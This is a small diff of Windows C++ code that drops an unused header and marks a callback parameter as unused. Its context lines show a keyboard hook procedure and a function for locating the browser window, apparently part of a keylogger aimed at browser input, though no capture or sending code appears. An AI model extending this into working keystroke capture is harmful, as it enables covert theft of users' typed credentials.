@@ -1,7 +1,6 @@
 #include <Windows.h>
 #include <fstream>
 #include <ctime>
-#include <sstream>
 #include <iomanip>
 #include <locale>
 #include <iostream>
@@ -46,7 +45,7 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 }
 
 // Function to find the browser window
-BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
+BOOL CALLBACK EnumWindowsProc(HWND hwnd, [[maybe_unused]] LPARAM lParam)
 {
     char class_name[80];
     GetClassName(hwnd, class_name, sizeof(class_name));
